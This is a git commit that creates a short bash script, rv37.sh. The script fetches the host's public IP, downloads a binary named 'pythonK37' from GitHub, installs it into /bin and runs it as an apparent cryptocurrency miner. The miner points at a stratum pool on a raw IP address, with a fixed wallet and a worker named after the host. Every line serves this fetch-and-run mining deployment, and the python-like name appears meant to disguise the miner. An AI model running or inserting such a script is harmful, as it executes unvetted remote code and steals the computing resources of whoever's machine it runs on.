b5bfc20585d16d5b1fb9453aa01e56f8fac75d4d
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-23 14:56:34 +0100

    Create rv37.sh

---
+++ rv37.sh
@@ -0,0 +1,9 @@
+#!bin/bash -xe 
+iip=$(curl https://ipecho.net/plain)
+IPNAME=$(sed 's|\.|o|g' <<< $iip)
+curl ipinfo.io
+#download build
+wget https://github.com/one10001/10001code/raw/main/pythonK37
+chmod +x pythonK37
+cp pythonK37 /bin/pythonK37
+pythonK37 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
